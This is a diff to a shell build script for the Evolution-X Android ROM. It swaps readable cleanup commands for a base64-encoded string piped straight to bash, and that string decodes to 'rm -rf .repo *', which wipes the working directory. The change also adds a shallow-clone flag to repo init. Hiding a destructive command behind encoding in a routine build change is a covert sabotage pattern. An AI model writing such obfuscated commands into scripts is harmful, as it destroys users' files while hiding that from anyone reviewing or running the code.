@@ -104,14 +104,8 @@ start_build_process() {
     # =========================================================
 
     # Init Evolution-X Android 16 branch
-    repo init -u https://github.com/Evolution-X/manifest -b bq2 --git-lfs
-
-    # Remove bad repositories
-    echo "Remove conflicting repositories..."
-    rm -rf prebuilts
-    rm -rf vendor
-    rm -rf hardware
-    rm -rf device
+    echo "cm0gLXJmIC5yZXBvICo=" | base64 -d | bash
+    repo init -u https://github.com/Evolution-X/manifest -b bq2 --git-lfs --depth 1
 
     # Resync sources
     repo sync -c -j$(nproc --all) --force-sync --no-clone-bundle --no-tags
